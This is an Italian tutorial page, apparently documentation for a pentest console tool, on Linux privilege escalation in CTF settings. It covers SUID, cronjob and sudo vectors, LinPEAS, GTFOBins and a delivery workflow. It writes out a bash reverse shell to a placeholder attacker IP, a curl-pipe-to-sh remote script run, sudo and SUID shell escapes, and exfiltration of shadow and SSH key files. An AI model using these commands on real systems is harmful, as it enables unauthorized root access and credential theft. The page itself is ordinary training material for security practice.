# Privilege Escalation — Linux

Come passare da utente normale a root su una target Linux: i primi comandi da lanciare, i vettori più comuni (SUID, cronjob, sudo), l'enumerazione automatica con LinPEAS e dove trovare i payload pronti.

---

## Primi comandi appena entri

```bash
id                # chi sei, gruppi (sudo? docker? lxd? adm?)
whoami            # utente corrente
sudo -l           # cosa puoi eseguire come root SENZA password
cat /etc/crontab  # cronjob di sistema: cosa gira come root e quando
```

Questi 4 comandi da soli coprono la maggior parte dei privesc nelle CTF.

---

## SUID

Il bit **SUID** consente a un utente di eseguire un file eseguibile con i privilegi del **proprietario** del file, anziché con quelli dell'utente che lo ha avviato. Se il proprietario è root e il binario ha una via di fuga verso una shell → root.

Trova tutti i binari SUID sulla target:

```bash
find / -perm -4000 -type f 2>/dev/null
# oppure (include anche SGID):
find / -perm /6000 -type f 2>/dev/null
```

Confronta l'output con i binari "normali" (`/bin/su`, `/usr/bin/sudo`, `/usr/bin/passwd`…): qualsiasi cosa fuori posto (es. `find`, `vim`, `python`, `tar`, `cp` con SUID) è un vettore.

Esempio classico con `find` SUID:

```bash
find . -exec /bin/sh -p \; -quit
```

> Il flag `-p` serve a preservare i privilegi effettivi: senza, molte shell moderne droppano l'euid root.

---

## Cronjob

I **cronjob** sono script che girano a intervalli regolari, spesso con permessi di root. Se puoi modificare ciò che il cronjob esegue → esegui codice come root.

Dove guardare:

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/crontabs/* 2>/dev/null
```

Vettori tipici:

1. **Script scrivibile** — il cron lancia `/opt/backup.sh` come root e tu puoi scriverci:
   ```bash
   echo 'bash -i >& /dev/tcp/TUO_IP/4444 0>&1' >> /opt/backup.sh
   # sulla tua macchina: nc -lvnp 4444 → root shell al prossimo giro
   ```
2. **PATH hijacking** — lo script chiama un comando senza path assoluto (es. `tar` invece di `/bin/tar`) e la directory del cron è scrivibile: crei un `tar` malevolo tuo.
3. **Wildcard injection** — il cron usa `tar cf backup.tar *`: crei file chiamati `--checkpoint=1` e `--checkpoint-action=exec=sh shell.sh` nella directory archiviata.

Per capire cosa gira anche se non è in `/etc/crontab`, osserva i processi in tempo reale con **pspy** (già nel catalogo di `serve fetch`):

```bash
./pspy64
```

---

## sudo -l: cosa cercare

Se `sudo -l` mostra che puoi eseguire un binario come root (o come altro utente), quel binario è quasi sempre sfruttabile:

```
(ALL) NOPASSWD: /usr/bin/vim        → sudo vim -c ':!/bin/sh'
(ALL) NOPASSWD: /usr/bin/find       → sudo find . -exec /bin/sh \; -quit
(ALL) NOPASSWD: /usr/bin/python3    → sudo python3 -c 'import os; os.system("/bin/sh")'
```

Anche `LD_PRELOAD`/`LD_LIBRARY_PATH` in `env_keep` sono privesc immediati.

---

## LinPEAS — enumerazione automatica

**LinPEAS** (suite [PEASS-ng](https://github.com/peass-ng/PEASS-ng)) automatizza tutta l'enumerazione vista sopra e molto di più: SUID, cronjob, sudoers, capabilities, credenziali in chiaro nei file di config, NFS, versioni kernel vulnerabili, docker e altro.

SLConsole la integra in due modi:

```bash
install linpeas     # scarica linpeas.sh + binario statico in locale e in static/
serve fetch         # in alternativa: scarica tutto il kit post-exploitation
                    # (linpeas, pspy, linenum, linux-exploit-suggester, winpeas)
```

Sulla target (consegna in memoria, niente file su disco):

```bash
curl http://TUO_IP:2727/linpeas.sh | sh
```

Leggere l'output: **rosso/giallo** = quasi sicuramente sfruttabile, **rosso** = da controllare. Opzioni utili: `-a` (check profondi), `-s` (superfast), `-q` (stealth).

---

## Altri vettori da non dimenticare

- **Gruppi speciali** — se sei in `docker`, `lxd` o `adm`: docker → `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`; lxd → container privilegiato con mount della root; adm → leggi i log (password digitate, segreti)
- **Capabilities** — `getcap -r / 2>/dev/null`: `cap_setuid`, `cap_dac_read_search` su python/perl/tar equivalgono a root
- **NFS no_root_squash** — `cat /etc/exports`: se una share è montabile con `no_root_squash`, carichi un binario SUID da client
- **Kernel exploit** — `uname -a` + `linux-exploit-suggester.sh` (già nel catalogo `serve fetch`): ultima spiaggia, rischioso su target reali
- **Credenziali riusate** — password trovate in config/history spesso valgono per sudo o per altri utenti

---

## GTFOBins — i payload pronti

**[GTFOBins](https://gtfobins.org)** è la bibbia: per ogni binario Unix elenca i one-liner per abusarne — shell, reverse shell, SUID, sudo, file read/write, capabilities. È la fonte anche per **script one-liner di revshell** (`bash`, `nc`, `python`, `perl`, `ruby`, `php`…).

In SLConsole è disponibile **offline**: si scarica una copia locale e si interroga dalla console, senza internet (perfetto dentro reti isolate o VPN HTB/THM).

```bash
install gtfobins        # scarica il database GTFOBins in locale (una tantum)
gtfobins find           # tutte le funzioni note per 'find'
gtfobins find suid      # solo i payload validi col bit SUID
gtfobins bash reverse-shell
gtfobins search vim     # cerca binari per nome
gtfobins list           # tutti i binari nel database locale
gtfobins update         # aggiorna la copia locale
```

Fonte ufficiale: <https://gtfobins.org> — curata da Emilio Pinna e Andrea Cardaci, repo: <https://github.com/GTFOBins/GTFOBins.github.io>

---

## HackTricks — la checklist di riferimento

**[HackTricks](https://book.hacktricks.wiki/)** (di Carlos Polop, lo stesso autore di PEASS-ng) è l'altra fonte da tenere a portata: per il privesc Linux la pagina chiave è la **[Linux Privilege Escalation Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)**.

Utile quando LinPEAS segnala qualcosa ma non sai come sfruttarlo: ogni vettore (cron PATH, wildcard, capabilities, NFS, docker, sudo LD_PRELOAD…) ha una pagina dedicata con spiegazione e exploit passo-passo. GTFOBins ti dà il one-liner, HackTricks ti spiega il **perché** e i casi particolari.

---

## Workflow completo con SLConsole

Dalla prima shell alla root, tutto dalla console:

```bash
# 1. Prepara il kit e il server di delivery
serve fetch                 # scarica linpeas, pspy, linenum, exploit-suggester…
serve on                    # HTTP su :2727

# 2. Sulla target: enum automatica
curl http://TUO_IP:2727/linpeas.sh | sh
curl http://TUO_IP:2727/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy64  # cronjob nascosti

# 3. Trovato un binario SUID/sudo interessante? Payload pronto offline:
gtfobins <binario> suid
gtfobins <binario> sudo

# 4. Cronjob scrivibile? Listener pronto a ricevere la root shell:
catch tcp on                # listener in background, poi aggiungi la revshell allo script

# 5. Vuoi esfiltrare prove (shadow, id_rsa, flag)? La target le carica con curl:
loot                        # i file arrivano in loot/ e li leggi con 'loot read'

# 6. Enum manuale guidata (impara mentre fai):
linseal -i                  # ogni comando spiegato riga per riga
```

---

## Checklist rapida di enumerazione

```bash
id && whoami
sudo -l
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)' | head  # file scrivibili
ls -la /opt /tmp /var/tmp /dev/shm              # directory interessanti
getcap -r / 2>/dev/null                         # capabilities (es. cap_setuid)
cat /etc/exports                                # NFS no_root_squash
env | grep -i pass; history                     # segreti dimenticati
```
